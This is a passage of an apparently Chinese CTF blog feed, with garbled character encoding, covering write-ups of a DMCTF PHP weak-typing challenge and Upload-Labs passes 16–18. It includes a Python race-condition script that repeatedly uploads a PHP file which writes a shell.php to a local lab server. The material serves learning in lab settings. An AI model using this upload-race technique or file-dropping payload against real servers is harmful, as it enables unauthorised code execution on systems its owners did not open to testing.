&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201102424.png" alt="">&lt;/p>
&lt;p>æ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯å››ä½æ•°æ®çš„CRC32ç¢°æ’ï¼Œå°±å»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªpythonè„šæœ¬ï¼š&lt;a href="https://blog.csdn.net/weixin_45396639/article/details/103393759">crc32ç¢°æ’ ctf python&lt;/a>ä½œè€…åŸåˆ›çš„è„šæœ¬ï¼š&lt;/p></description></item><item><title>DMCTFä¹‹Web</title><link>/posts/ctf/dmctf%E4%B9%8Bweb/</link><pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid><description>&lt;h1 id="å‰è¨€">å‰è¨€&lt;/h1>
&lt;p>æ¯”èµ›åœ°å€ï¼š&lt;a href="http://dmctf.vaala.cloud:81/">http://dmctf.vaala.cloud:81&lt;/a>&lt;/p>
&lt;p>è¿™æ¬¡å…ˆå†™Webé¢˜ç›®éƒ¨åˆ†ï¼Œæˆ‘æœ€åçš„æ’åï¼š&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" alt="img">&lt;/p>
&lt;h1 id="web">Web&lt;/h1>
&lt;h2 id="weak_type">weak_type&lt;/h2>
&lt;p>æºç ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>PHP
&amp;lt;?php

show_source(__FILE__);
include(&amp;#39;class.php&amp;#39;);

//level1 

if(isset($_GET[&amp;#39;num&amp;#39;])){
 $num = $_GET[&amp;#39;num&amp;#39;];
 if($num===&amp;#34;202020020&amp;#34;){
 die(&amp;#34;no no no!&amp;#34;);
 }
 if(intval($num,0)===202020020){
 echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;
 }else{
 die(&amp;#39;what are you doing?&amp;#39;);
 }
}else{
 die();
}

//level 2

if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){
 $v1 = $_GET[&amp;#39;v1&amp;#39;];
 $v2 = $_GET[&amp;#39;v2&amp;#39;];
 if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){
 echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;
 }else{
 die(&amp;#39;Are you kidding me ?&amp;#39;);
 }
}else{
 die();
}

//level 3 

if (isset($_POST[&amp;#39;message&amp;#39;])) {
 $message = json_decode($_POST[&amp;#39;message&amp;#39;]);
 if ($message-&amp;gt;key == $key) {
 echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !!! &amp;lt;br&amp;gt;&amp;#34;;
 echo file_get_contents(&amp;#39;/flag&amp;#39;);
 } 
 else {
 die(&amp;#34;fail&amp;#34;);
 }
 }
else{
 echo &amp;#34;~~~~&amp;#34;;
 }
&lt;/code>&lt;/pre>&lt;p>&lt;strong>ç¬¬ä¸€å…³&lt;/strong>åˆ©ç”¨intval()å‡½æ•°ç‰¹æ€§ï¼šç›´åˆ°é‡ä¸Šæ•°å­—æˆ–æ­£è´Ÿç¬¦å·æ‰å¼€å§‹åšè½¬æ¢ã€‚æ‰€ä»¥æ„é€ &lt;code>num=202020020a&lt;/code>ï¼Œå³å¯ã€‚&lt;/p></description></item><item><title>Upload-Labsçš„æœ€åå‡ é“é¢˜</title><link>/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate><guid>/posts/ctf/upload-labs5/</guid><description>&lt;h2 id="pass-17">Pass-17&lt;/h2>
&lt;p>â€‹	ï¼ˆwindowsç¯å¢ƒï¼Œphpç‰ˆæœ¬5.2.17ï¼Œé¢˜å·æ˜¯18é¢˜ï¼‰&lt;/p>
&lt;p>æºç ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_name &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($file_name,&lt;span style="color:#a6e22e">strrpos&lt;/span>($file_name,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $upload_file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $file_name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $upload_file)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rename&lt;/span>($upload_file, $img_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">unlink&lt;/span>($upload_file);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	æ€è·¯å’Œå‰é¢çš„ä¸€æ ·ï¼Œè·å–æ–‡ä»¶ä¿¡æ¯ï¼Œç§»åŠ¨æ–‡ä»¶åˆ°&lt;strong>upload&lt;/strong>æ–‡ä»¶å¤¹ï¼Œç¬¬12è¡Œä½¿ç”¨äº†ç™½åå•éªŒè¯ï¼Œå¤šäº†ç¬¬14è¡Œçš„&lt;code>rename&lt;/code>å‡½æ•°ï¼Œçœ‹åç§°å°±æ˜¯é‡å‘½åçš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨é‡å‘½åä¹‹å‰è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é¢˜ç”¨åˆ°äº†&lt;strong>ä¸Šä¼ ç«äº‰&lt;/strong>ï¼Œä½¿ç”¨&lt;code>python&lt;/code>è„šæœ¬ä¸æ–­çš„å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åè®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¸­æœ‰ä¸€å¥ä»£ç &lt;code>&amp;lt;?php fputs(fopen('shell.php','w'),'&amp;lt;?php phpinfo();?&amp;gt;');?&amp;gt;&lt;/code>è¿™æ®µä»£ç æ‰§è¡Œä»¥åï¼Œä¼šåˆ›å»ºä¸€ä¸ªåä¸º&lt;code>shell.php&lt;/code>é‡Œé¢æœ‰ä¸€å¥&lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>çš„æ–‡ä»¶ã€‚&lt;/p>
&lt;p>â€‹	è„šæœ¬ä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> multiprocessing &lt;span style="color:#f92672">import&lt;/span> Pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">CompeteUpload&lt;/span>(list):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/Pass-18/index.php&amp;#34;&lt;/span> &lt;span style="color:#75715e">#ä¸Šä¼ é¡µé¢&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> geturl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/upload/233.php&amp;#34;&lt;/span>	 &lt;span style="color:#75715e">#è®¿é—®ä¸Šä¼ æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>:(&lt;span style="color:#e6db74">&amp;#39;233.php&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;);?&amp;gt;&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>)}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;ä¸Šä¼ &amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>post(url&lt;span style="color:#f92672">=&lt;/span>url,data&lt;span style="color:#f92672">=&lt;/span>data,files&lt;span style="color:#f92672">=&lt;/span>file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print &amp;#34;test upload....&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r1&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">=&lt;/span>geturl)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r1&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (&lt;span style="color:#e6db74">&amp;#34;upload success!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool &lt;span style="color:#f92672">=&lt;/span> Pool(&lt;span style="color:#ae81ff">10&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>map(CompeteUpload, range(&lt;span style="color:#ae81ff">10000&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	ç¬¬ä¸€æ¬¡ç”¨pythonçš„æˆ‘åœ¨è¿™é‡ŒçŸ¥é“äº†&lt;code>pip&lt;/code>ã€‚è¿™é“é¢˜å› ä¸ºè¦ä¸æ–­çš„ä¸Šä¼ å’Œè®¿é—®æ–‡ä»¶ï¼Œæ‰€ä»¥å¯¹åœ¨çº¿é¶åœºä¸å‹å¥½ï¼Œæ‰€ä»¥æ‰é€‰æ‹©äº†æœ¬åœ°ç¯å¢ƒè§£é¢˜ã€‚å®Œå·¥&lt;/p></description></item><item><title>Upload-Labsä¹‹Pass-16</title><link>/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate><guid>/posts/ctf/upload-labs4/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>â€‹	æˆ‘åœ¨è¿™é“é¢˜ä¸ŠèŠ±äº†å¿«ä¸€å¤©çš„æ—¶é—´ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œè§‰å¾—ä¸œè¥¿åº”è¯¥è¶³å¤Ÿå¤šï¼Œè€Œä¸”å‚è€ƒäº†çš„åšå®¢å‘ç°è¿™é“é¢˜ç®—æ˜¯æœ‰æ­§ä¹‰çš„ï¼Œä¸çŸ¥é“ä½œè€…æƒ³è¦è€ƒå¯Ÿçš„ç‚¹æ˜¯å“ªä¸€ä¸ªï¼Œæ‰€ä»¥ç®—æ˜¯æœ‰ä¸¤ç§è§£æ³•å§ï¼Œå¯æƒœçš„æ˜¯ä¸¤ç§æ–¹æ³•éƒ½ä¸ç®—æ˜¯å¤§æˆåŠŸï¼Œåªæœ‰éƒ¨åˆ†æˆåŠŸæ‰§è¡Œäº†ã€‚&lt;/p>
&lt;p>â€‹	å‚è€ƒåšå®¢ï¼š&lt;a href="https://xz.aliyun.com/t/2657#toc-4">upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ&lt;/a>&lt;/p>
&lt;h2 id="pass-16">Pass-16&lt;/h2>
&lt;p>â€‹	æºç ï¼ˆä¸‰ç§å›¾ç‰‡çš„åˆ¤å®šï¼Œåªè´´ä¸€ä¸ªå§ï¼Œç¯‡å¹…å°ä¸€ç‚¹ï¼‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filename &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filetype &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $tmpname &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $target_path&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">basename&lt;/span>($filename);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $fileext&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">strrchr&lt;/span>($filename,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>),&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;jpg&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/jpeg&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($tmpname,$target_path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $im &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">imagecreatefromjpeg&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($im &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">srand&lt;/span>(&lt;span style="color:#a6e22e">time&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $newfilename &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strval&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>())&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.jpg&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$newfilename;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">imagejpeg&lt;/span>($im,$img_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ä¸Šä¼ å‡ºé”™ï¼&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;png&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/png&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">......&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gif&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/gif&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€‹	æç¤ºï¼š&lt;code>æœ¬passé‡æ–°æ¸²æŸ“äº†å›¾ç‰‡ï¼&lt;/code>ã€‚è¯´æ˜å¯¹å›¾ç‰‡è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“ï¼Œæˆ‘çš„ç†è§£å°±æ˜¯æŠŠä¸Šä¼ çš„å›¾ç‰‡ï¼Œæ ¹æ®ä¸€äº›æ ‡å‡†ï¼ŒåªæŠŠå›¾ç‰‡ä¸­çš„å›¾ç‰‡ä¿¡æ¯æå–å‡ºæ¥ï¼Œå†ç”Ÿæˆä¸€ä¸ªå›¾ç‰‡ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…å›¾ç‰‡é©¬ã€‚&lt;/p></description></item><item><title>Upload-Labs(ä¸‰)</title><link>/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate><guid>/posts/ctf/upload-labs3/</guid><description>&lt;h2 id="å‰è¨€">å‰è¨€&lt;/h2>
&lt;p>â€‹	ç»§ç»­æ¥ç€ä¸Šä¸€æ¬¡çš„&lt;code>Upload-labs&lt;/code>å¾€ä¸‹å†™ã€‚è¿™è®°ä¸‹ç¬¬11-15é¢˜ï¼Œç›®å‰è¿›åº¦æ˜¯20é¢˜éƒ½å·²ç»å®Œæˆæ­£åœ¨æŠ½æ—¶é—´å†™åšå®¢ï¼Œç„¶å16é¢˜æ˜¯æˆ‘å¡çš„æœ€ä¹…çš„å…³ï¼Œä¸è¿‡ä¹Ÿå­¦åˆ°äº†æ„Ÿè§‰å¾ˆç‰›çš„å§¿åŠ¿ï¼Œæ‰€ä»¥åˆ°æ—¶å€™ä¸“é—¨å¼€ä¸€ç¯‡åªè®²16ã€‚&lt;/p>
&lt;p>â€‹	åœ¨çº¿é¶æœºåœ°å€ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linuxç¯å¢ƒ&lt;/a>&lt;/li>
